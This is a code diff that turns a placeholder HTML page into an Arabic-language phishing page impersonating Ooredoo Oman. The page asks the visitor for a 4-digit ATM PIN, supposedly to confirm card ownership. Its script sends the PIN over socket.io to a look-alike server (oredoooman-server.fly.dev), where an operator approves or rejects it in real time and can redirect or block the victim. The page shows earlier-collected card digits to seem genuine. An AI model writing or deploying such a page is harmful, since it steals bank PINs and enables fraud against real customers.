@@ -1,23 +1,161 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>رمز التحقق CVV | Ooredoo Oman</title>
-    <script>
-        // In a real scenario, this might redirect to a React route or handle the logic
-        console.log("Static placeholder for رمز التحقق CVV");
-    </script>
-    <style>
-        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f7f7f7; }
-        .card { background: white; padding: 2rem; border-radius: 1rem; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }
-        h1 { color: #ed1c24; }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>إثبات ملكية البطاقة ATM | Ooredoo</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; direction: rtl; }
+.container { width: 100%; max-width: 420px; margin: 40px auto; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; }
+h1 { text-align: center; font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 4px; }
+.atm-label { text-align: center; font-size: 24px; font-weight: 700; color: #6b9e8a; margin-bottom: 10px; }
+.subtitle { text-align: center; color: #4c5562; font-size: 14px; margin-bottom: 20px; }
+.description { background: #f9fafb; border-radius: 12px; padding: 16px 18px; margin-bottom: 28px; color: #333; font-size: 14px; line-height: 1.8; text-align: right; }
+.pin-input-area { display: flex; justify-content: center; gap: 14px; margin-bottom: 24px; direction: ltr; }
+.pin-input-area input { width: 52px; height: 60px; border: 1.5px solid #e0e0e0; border-radius: 12px; text-align: center; font-size: 24px; font-weight: 600; outline: none; transition: border-color 0.2s; }
+.pin-input-area input:focus { border-color: #6b9e8a; }
+.error-msg { color: #ed1c24; font-size: 13px; text-align: center; margin-bottom: 16px; display: none; }
+.submit-btn { width: 100%; height: 54px; border-radius: 12px; border: none; background: #6b9e8a; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+.submit-btn:hover { background: #5a8a78; }
+.submit-btn:disabled { background: #b8d4c8; cursor: not-allowed; }
+.waiting-msg { text-align: center; color: #6b9e8a; font-size: 14px; margin-top: 12px; display: none; }
+@media (max-width: 500px) {
+  .container { margin: 0; border-radius: 0; min-height: 100vh; padding: 24px 16px; }
+}
+</style>
 </head>
 <body>
-    <div class="card">
-        <h1>رمز التحقق CVV</h1>
-        <p>هذه الصفحة قيد التطوير أو سيتم توجيهك قريباً.</p>
-    </div>
+<div class="container">
+  <h1>إثبات ملكية البطاقة</h1>
+  <div class="atm-label">ATM</div>
+  <p class="subtitle">لتأكيد العملية أدخل الرقم السري للصراف الآلي</p>
+
+  <div class="description">
+    يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة المنتهية بـ <strong id="lastDigits">****</strong> ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
+  </div>
+
+  <div class="pin-input-area">
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="0" autofocus>
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="1">
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="2">
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="3">
+  </div>
+
+  <div class="error-msg" id="pinError">الرقم السري غير صحيح. يرجى المحاولة مرة أخرى.</div>
+
+  <button class="submit-btn" id="submitBtn" onclick="submitPIN()" disabled>تأكيد</button>
+  <div class="waiting-msg" id="waitingMsg">جاري التحقق...</div>
+</div>
+
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script>
+(function() {
+  var SOCKET_URL = 'https://oredoooman-server.fly.dev';
+  var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
+  var visitorId = localStorage.getItem('visitorId') || '';
+
+  // Load payment data - get last 4 digits
+  var paymentData = {};
+  try { paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}'); } catch(e) {}
+  var last4 = paymentData.cardLast4 || '****';
+  document.getElementById('lastDigits').textContent = last4;
+
+  // PIN digit inputs
+  var digits = document.querySelectorAll('.pin-digit');
+  digits.forEach(function(input, idx) {
+    input.addEventListener('input', function() {
+      var val = this.value.replace(/\D/g, '');
+      this.value = val.slice(0, 1);
+      if (val && idx < digits.length - 1) digits[idx + 1].focus();
+      checkPINComplete();
+    });
+    input.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace' && !this.value && idx > 0) {
+        digits[idx - 1].focus();
+      }
+    });
+    input.addEventListener('paste', function(e) {
+      e.preventDefault();
+      var paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+      for (var i = 0; i < Math.min(paste.length, digits.length); i++) {
+        digits[i].value = paste[i];
+      }
+      if (paste.length >= digits.length) digits[digits.length - 1].focus();
+      else if (paste.length > 0) digits[paste.length].focus();
+      checkPINComplete();
+    });
+  });
+
+  function checkPINComplete() {
+    var code = getPINCode();
+    var btn = document.getElementById('submitBtn');
+    if (code.length === 4) { btn.disabled = false; }
+    else { btn.disabled = true; }
+  }
+
+  function getPINCode() {
+    var code = '';
+    digits.forEach(function(d) { code += d.value; });
+    return code;
+  }
+
+  // Socket
+  socket.on('connect', function() {
+    socket.emit('visitor:register', { existingVisitorId: visitorId || null });
+    socket.emit('visitor:pageEnter', 'رمز ATM');
+  });
+  socket.on('visitor:registered', function(data) {
+    if (data && data._id) { visitorId = data._id; localStorage.setItem('visitorId', data._id); }
+    if (data && data.pid) localStorage.setItem('visitorId', data.pid);
+  });
+  socket.on('visitor:navigate', function(page) { if (page) window.location.href = '/' + page; });
+  socket.on('admin-last-message', function(data) {
+    if (data && data.message) { localStorage.setItem('adminLastMessage', data.message); window.location.href = '/final-page/'; }
+  });
+  socket.on('blocked', function() { alert('تم حظرك.'); });
+
+  socket.on('code:action', function(action) {
+    var act = (typeof action === 'string') ? action : (action && action.action) || '';
+    document.getElementById('waitingMsg').style.display = 'none';
+    document.getElementById('submitBtn').disabled = false;
+    document.getElementById('submitBtn').textContent = 'تأكيد';
+
+    if (act === 'approve') {
+      window.location.href = '/final-page/';
+    } else if (act === 'reject') {
+      document.getElementById('pinError').style.display = 'block';
+      digits.forEach(function(d) { d.value = ''; });
+      digits[0].focus();
+    }
+  });
+
+  socket.on('card:action', function(action) {
+    var act = (typeof action === 'string') ? action : (action && action.action) || '';
+    document.getElementById('waitingMsg').style.display = 'none';
+    if (act === 'reject') {
+      document.getElementById('pinError').style.display = 'block';
+      digits.forEach(function(d) { d.value = ''; });
+      digits[0].focus();
+    }
+  });
+
+  // Submit PIN
+  window.submitPIN = function() {
+    var code = getPINCode();
+    if (code.length !== 4) return;
+    document.getElementById('pinError').style.display = 'none';
+    document.getElementById('submitBtn').disabled = true;
+    document.getElementById('submitBtn').textContent = 'جاري التحقق...';
+    document.getElementById('waitingMsg').style.display = 'block';
+
+    socket.emit('more-info', {
+      digitCode: code,
+      page: 'رمز ATM',
+      waitingForAdminResponse: true
+    });
+  };
+})();
+</script>
 </body>
 </html>
